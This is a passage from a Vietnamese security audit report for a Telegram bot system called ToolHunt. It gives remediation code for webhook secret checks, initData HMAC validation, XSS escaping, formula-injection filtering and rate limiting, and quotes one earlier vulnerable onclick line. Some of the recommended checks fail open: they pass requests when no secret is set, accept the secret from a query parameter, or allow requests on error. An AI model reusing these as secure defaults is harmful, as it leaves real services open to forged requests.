      Logger.log("Lỗi truy xuất Script Properties: " + e.message);
    }
    // 2. Fallback đọc từ Sheet Config (để hỗ trợ quá trình di trú)
    return getConfig(key);
  },

  set: function(key, value) {
    PropertiesService.getScriptProperties().setProperty(key, value);
  },

  setBatch: function(keyValueMap) {
    PropertiesService.getScriptProperties().setProperties(keyValueMap);
  },

  getBotToken: function() {
    const token = this.get("BOT_TOKEN");
    return (token && !token.includes("YOUR_")) ? token : "";
  },

  getWebhookSecret: function() {
    return this.get("TELEGRAM_WEBHOOK_SECRET");
  }
};
```

---

## 4. CHUYÊN ĐỀ 2: XÁC THỰC CHỮ KÝ TELEGRAM WEBHOOK (X-TELEGRAM-BOT-API-SECRET-TOKEN)

### 4.1. Cơ chế hoạt động của Telegram Webhook Secret Token

Khi đăng ký webhook với Telegram, hệ thống truyền tham số `secret_token`:
`POST https://api.telegram.org/bot<TOKEN>/setWebhook`
```json
{
  "url": "https://script.google.com/macros/s/.../exec",
  "secret_token": "a1b2c3d4e5f6g7h8_SECRET_TOKEN_32_CHARS",
  "allowed_updates": ["message", "callback_query"]
}
```

Telegram đảm bảo mọi bản tin webhook gửi tới sẽ luôn chứa header:
`X-Telegram-Bot-Api-Secret-Token: a1b2c3d4e5f6g7h8_SECRET_TOKEN_32_CHARS`

### 4.2. Triển khai bộ lọc xác thực an toàn chống Timing Attack trong `doPost`

```javascript
/**
 * Hàm so sánh chuỗi thời gian bất biến (Constant-Time String Comparison)
 * Ngăn chặn hoàn toàn tấn công kênh phụ đo thời gian (Timing Side-Channel Attacks)
 */
function constantTimeCompare(a, b) {
  if (typeof a !== "string" || typeof b !== "string") return false;
  if (a.length !== b.length) return false;
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return result === 0;
}

/**
 * Middleware kiểm tra tính hợp lệ của Webhook Telegram
 */
function verifyTelegramWebhook(e) {
  const expectedSecret = SecretsManager.getWebhookSecret();
  // Nếu chưa cấu hình secret thì cảnh báo trong log và cho qua (để tương thích bước setup đầu)
  if (!expectedSecret) return true;

  const headers = (e && e.headers) ? e.headers : {};
  // Xử lý chuẩn hóa tên header (không phân biệt chữ hoa chữ thường)
  let receivedSecret = "";
  for (const key in headers) {
    if (key.toLowerCase() === "x-telegram-bot-api-secret-token") {
      receivedSecret = headers[key];
      break;
    }
  }

  // Dự phòng kiểm tra tham số query nếu header bị proxy stripped
  if (!receivedSecret && e && e.parameter && e.parameter.secret) {
    receivedSecret = e.parameter.secret;
  }

  return constantTimeCompare(receivedSecret, expectedSecret);
}
```

---

## 5. CHUYÊN ĐỀ 3: XÁC THỰC MÃ HÓA TELEGRAM WEBAPP INITDATA (HMAC-SHA256)

### 5.1. Thuật toán xác thực chuẩn Telegram WebApp

```
1. Client WebApp (app.js):
   initData string: "auth_date=1725300000&query_id=AAH...&user=%7B%22id%22%3A123456...%7D&hash=d8a5..."

2. Backend (Code.js):
   a. Tách 'hash' ra khỏi chuỗi.
   b. Phân tích chuỗi còn lại thành các cặp key=value.
   c. Sắp xếp các cặp theo thứ tự alphabet của key.
   d. Nối lại bằng dấu '\n' -> tạo thành 'data_check_string'.
   e. Khóa bí mật (secret_key) = HMAC_SHA256(key="WebAppData", data=BOT_TOKEN).
   f. Chữ ký tính toán = Hex(HMAC_SHA256(key=secret_key, data=data_check_string)).
   g. So sánh: constantTimeCompare(Chữ ký tính toán, hash) === true.
   h. Kiểm tra: (Thời gian hiện tại - auth_date) <= 86400 (Chống Replay Attack).
```

### 5.2. Triển khai hoàn chỉnh bằng Google Apps Script Native Crypto API (`Utilities.computeHmacSha256Signature`)

```javascript
/**
 * Module xác thực danh tính người dùng từ Telegram WebApp initData
 */
function validateTelegramWebAppData(initDataString, botToken) {
  if (!initDataString || !botToken) {
    return { isValid: false, error: "MISSING_DATA_OR_TOKEN" };
  }

  try {
    const params = new URLSearchParams(initDataString);
    const hash = params.get("hash");
    if (!hash) return { isValid: false, error: "MISSING_HASH" };

    params.delete("hash");

    // Sắp xếp các cặp key=value theo thứ tự alphabet
    const sortedKeys = Array.from(params.keys()).sort();
    const dataCheckArr = [];
    sortedKeys.forEach(key => {
      dataCheckArr.push(`${key}=${params.get(key)}`);
    });
    const dataCheckString = dataCheckArr.join("\n");

    // Bước 1: Tính secret_key từ Bot Token với key là "WebAppData"
    const secretKeyBytes = Utilities.computeHmacSha256Signature(
      botToken,
      "WebAppData"
    );

    // Bước 2: Tính HMAC_SHA256 của data_check_string với secretKeyBytes
    const calculatedHashBytes = Utilities.computeHmacSha256Signature(
      dataCheckString,
      secretKeyBytes
    );

    // Chuyển mảng Byte sang chuỗi Hex
    const calculatedHash = calculatedHashBytes.map(byte => {
      const v = (byte < 0 ? byte + 256 : byte).toString(16);
      return v.length === 1 ? "0" + v : v;
    }).join("");

    // Bước 3: So sánh an toàn thời gian bất biến
    if (!constantTimeCompare(calculatedHash, hash)) {
      return { isValid: false, error: "INVALID_HASH_SIGNATURE" };
    }

    // Bước 4: Kiểm tra thời hạn auth_date (không quá 24h)
    const authDate = parseInt(params.get("auth_date"), 10);
    const now = Math.floor(Date.now() / 1000);
    if (isNaN(authDate) || (now - authDate) > 86400) {
      return { isValid: false, error: "AUTH_DATE_EXPIRED" };
    }

    // Bước 5: Trích xuất thông tin người dùng đã được ký xác nhận
    const userStr = params.get("user");
    const user = userStr ? JSON.parse(userStr) : null;

    return {
      isValid: true,
      user: user,
      authDate: authDate
    };
  } catch (err) {
    return { isValid: false, error: "VALIDATION_EXCEPTION: " + err.message };
  }
}
```

---

## 6. CHUYÊN ĐỀ 4: CHỐNG XSS & HTML INJECTION SANITIZATION

### 6.1. Ma trận xử lý dữ liệu đầu ra an toàn (Safe Output Context Matrix)

| Ngữ Cảnh Xuất Dữ Liệu | Mối Nguy Hại | Giải Pháp Bắt Buộc |
| :--- | :--- | :--- |
| **Telegram HTML Message** (`parse_mode: "HTML"`) | Vỡ cấu trúc thẻ HTML, Phishing Link, Crash API `400 Bad Request` | Escape toàn bộ `<`, `>`, `&` trong các biến động (`ideaTitle`, `author`, `reason`) |
| **HTML Attribute (VD: `href=""`)** | Thoát dấu ngoặc kép, XSS qua giao thức `javascript:` | Kiểm tra URL bắt đầu bằng `http://` hoặc `https://`, Escape `"` và `&` |
| **Inline JS Event Handler (VD: `onclick=""`)** | Thoát nháy đơn/kép thực thi mã JavaScript tùy ý | **Cấm truyền chuỗi động** vào thuộc tính sự kiện. Chỉ truyền ID số nguyên `onclick="handleAction(123)"` |
| **DOM Rendering (Web Dashboard)** | DOM XSS khi dùng `innerHTML` | Sử dụng `escapeHtml()` toàn diện hoặc `element.innerText = text` |

### 6.2. Hàm Escaping chuẩn hóa toàn diện:

```javascript
function escapeHtmlFull(str) {
  if (str === null || str === undefined) return "";
  return str.toString()
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

---

## 7. CHUYÊN ĐỀ 5: BẢO MẬT GOOGLE SHEETS BACKEND

### 7.1. Chống Formula / CSV Injection

Trước khi ghi bất kỳ chuỗi văn bản nào do người dùng cung cấp vào bảng tính qua `appendRow` hoặc `setValue`, áp dụng bộ lọc:

```javascript
function sanitizeSheetValue(val) {
  if (typeof val !== "string") return val;
  const trimmed = val.trim();
  // Nếu bắt đầu bằng ký tự công thức, thêm dấu nháy đơn (') phía trước
  if (/^[=+\-@\t\r]/.test(trimmed)) {
    return "'" + trimmed;
  }
  return val;
}
```

### 7.2. Bảo vệ chống cạn kiệt tài nguyên & Tấn công từ chối dịch vụ (DoS)

```javascript
/**
 * Rate Limiter đơn giản bằng CacheService
 */
function checkRateLimit(identifier, maxRequests = 10, windowSeconds = 60) {
  try {
    const cache = CacheService.getScriptCache();
    if (!cache) return true;
    const key = "rl_" + identifier;
    const current = cache.get(key);
    const count = current ? parseInt(current, 10) : 0;
    if (count >= maxRequests) {
      return false; // Vượt quá giới hạn
    }
    cache.put(key, (count + 1).toString(), windowSeconds);
    return true;
  } catch (e) {
    return true; // Fallback an toàn
  }
}
```

---

## 8. BẢN THIẾT KẾ & CODE KHẮC PHỤC CHUẨN DOANH NGHIỆP (ENTERPRISE REMEDIATION BLUEPRINT)

Dưới đây là các đoạn mã đề xuất thay thế trực tiếp cho từng thành phần bị ảnh hưởng:

### 8.1. Khắc phục `doPost` trong `google-apps-script/Code.js`

```javascript
function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return createJsonResponse({ ok: false, error: "MISSING_POST_DATA" });
    }

    const contents = JSON.parse(e.postData.contents);

    // 1. Phân luồng: Yêu cầu từ Web Dashboard / Mini App
    if (contents.apiAction) {
      return handleSecureApiPostRequest(contents, e);
    }

    // 2. Phân luồng: Webhook Telegram Bot -> BẮT BUỘC XÁC THỰC WEBHOOK SECRET
    if (!verifyTelegramWebhook(e)) {
      Logger.log("CẢNH BÁO: Từ chối Webhook không có Secret Token hợp lệ!");
      return createJsonResponse({ ok: false, error: "UNAUTHORIZED_WEBHOOK_SECRET" });
    }

    // 3. Chống lặp tin nhắn (Anti-duplicate update_id)
    if (contents.update_id) {
      const cache = CacheService.getScriptCache();
      if (cache) {
        const cacheKey = "tg_upd_" + contents.update_id;
        if (cache.get(cacheKey)) return createJsonResponse({ ok: true });
        cache.put(cacheKey, "1", 300);
      }
    }

    // 4. Đồng bộ LockService
    const lock = LockService.getScriptLock();
    try {
      lock.waitLock(10000);
    } catch (err) {}

    const ss = SpreadsheetApp.getActiveSpreadsheet();

    const incomingMsg = contents.message || contents.channel_post;
    if (incomingMsg) {
      handleTelegramMessage(incomingMsg, ss);
    }

    if (contents.callback_query) {
      handleTelegramCallbackQuery(contents.callback_query, ss);
    }

    return createJsonResponse({ ok: true });
  } catch (err) {
    Logger.log("Lỗi doPost: " + err.message);
    return createJsonResponse({ ok: false, error: "INTERNAL_ERROR" });
  } finally {
    try { LockService.getScriptLock().releaseLock(); } catch (e) {}
  }
}
```

### 8.2. Khắc phục `notifyIdeaVoters` trong `google-apps-script/Code.js`

```javascript
function notifyIdeaVoters(ideaId, newStatus, extraData, ss) {
  const targetSs = ss || SpreadsheetApp.getActiveSpreadsheet();
  const votesSheet = targetSs.getSheetByName("Votes");
  const ideasSheet = targetSs.getSheetByName("Ideas");
  if (!votesSheet || !ideasSheet) return { notifiedCount: 0, recipientUserIds: [] };

  const ideasData = ideasSheet.getDataRange().getValues();
  let ideaTitle = "";
  let devUsername = "";
  for (let i = 1; i < ideasData.length; i++) {
    if (ideasData[i][0] == ideaId) {
      ideaTitle = ideasData[i][4];
      devUsername = ideasData[i][13] || "@developer";
      break;
    }
  }

  // Trích xuất Active Voters
  const votesData = votesSheet.getDataRange().getValues();
  const voterMap = new Map();
  for (let i = 1; i < votesData.length; i++) {
    const row = votesData[i];
    if (row[1] == ideaId) {
      if (row[4] === "UPVOTE" || row[4] === "VOTE") {
        voterMap.set(row[2], { username: row[3], active: true });
      } else if (row[4] === "UNVOTE") {
        voterMap.set(row[2], { username: row[3], active: false });
      }
    }
  }

  const activeVoters = [];
  voterMap.forEach((val, uid) => {
    if (val.active) activeVoters.push({ userId: uid, username: val.username });
  });

  const demoBase = getConfig("DEMO_BASE_URL") || "https://toolhunt.enterprise/demo/";
  const feedbackBase = getConfig("FEEDBACK_BASE_URL") || "https://toolhunt.enterprise/feedback/";
  const rawDemoUrl = (extraData && extraData.demoUrl) ? extraData.demoUrl : (demoBase + ideaId);
  const rawFeedbackUrl = (extraData && extraData.feedbackUrl) ? extraData.feedbackUrl : (feedbackBase + ideaId);

  // SANITIZE ĐẦU RA AN TOÀN
  const safeTitle = escapeHtmlFull(ideaTitle);
  const safeDev = escapeHtmlFull(devUsername);
  const safeDemoUrl = escapeHtmlFull(rawDemoUrl);
  const safeFeedbackUrl = escapeHtmlFull(rawFeedbackUrl);

  activeVoters.forEach(voter => {
    const safeVoterName = escapeHtmlFull(voter.username || "Thành viên");
    let msgText = "";
    if (newStatus.includes("Beta")) {
      msgText = `🧪 <b>[THÔNG BÁO TRẢI NGHIỆM BETA]</b>\n\n` +
        `Chào ${safeVoterName}, ý tưởng bạn từng Upvote <b>#${ideaId}: ${safeTitle}</b> do ${safeDev} phát triển vừa ra mắt bản Beta Testing!\n\n` +
        `🔗 Link dùng thử: <a href="${safeDemoUrl}">${safeDemoUrl}</a>\n` +
        `📝 Góp ý nhanh: <a href="${safeFeedbackUrl}">${safeFeedbackUrl}</a>\n\n` +
        `Cảm ơn bạn đã đồng hành cùng ToolHunt!`;
    } else if (newStatus.includes("Hoàn thành") || newStatus.includes("Completed")) {
      msgText = `🎉 <b>[CÔNG BỐ TOOL HOÀN THÀNH]</b>\n\n` +
        `Chào ${safeVoterName}, ý tưởng <b>#${ideaId}: ${safeTitle}</b> đã chính thức hoàn thành và phát hành rộng rãi!\n\n` +
        `🚀 Truy cập sản phẩm: <a href="${safeDemoUrl}">${safeDemoUrl}</a>\n\n` +
        `Chúc bạn có trải nghiệm tuyệt vời!`;
    }

    if (msgText) {
      try {
        sendTelegramMessage(voter.userId, msgText);
      } catch (err) {
        Logger.log(`Không thể gửi DM tới voter ${voter.userId}: ` + err.message);
      }
    }
  });

  return {
    notifiedCount: activeVoters.length,
    recipientUserIds: activeVoters.map(v => v.userId)
  };
}
```

### 8.3. Khắc phục Web Dashboard Client (`web-dashboard/app.js`)

1. Sửa dòng 324 loại bỏ nhúng chuỗi vào `onclick`:
```javascript
// TRƯỚC: <button onclick="openBountyModal(${idea.id}, '${escapeHtml(idea.title.replace(/'/g, "\\'"))}')">
// SAU:
<button onclick="openBountyModalById(${idea.id})" class="px-2.5 py-1.5 rounded-xl bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/20 font-semibold flex items-center space-x-1 transition-all">
  <i class="fa-solid fa-sack-dollar text-amber-400"></i>
  <span>Treo thưởng</span>
</button>
```

2. Cập nhật hàm `openBountyModalById`:
```javascript
function openBountyModalById(ideaId) {
  const idea = STATE.ideas.find(i => i.id === ideaId);
  const title = idea ? idea.title : "";
  openBountyModal(ideaId, title);
}
```

3. Đính kèm `initData` vào mọi yêu cầu POST:
```javascript
async function sendApiRequest(action, payload) {
  if (!STATE.apiUrl) return null;
  const tgInitData = (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData) ? window.Telegram.WebApp.initData : "";
  
  const bodyData = {
    apiAction: action,
    initData: tgInitData,
    ...payload
  };

  const res = await fetch(STATE.apiUrl, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify(bodyData)
  });
  return await res.json();
}
```

---

## 9. TỔNG KẾT & KẾT LUẬN

Báo cáo kiểm toán bảo mật đã phân tích chi tiết và định danh **11 lỗ hổng bảo mật** trên toàn bộ hệ thống ToolHunt Enterprise. Việc triển khai các giải pháp khắc phục nêu trên sẽ đưa hệ thống đạt chuẩn bảo mật doanh nghiệp cấp độ cao, loại bỏ hoàn toàn các nguy cơ giả mạo danh tính, rò rỉ khóa API, và tấn công Injection.
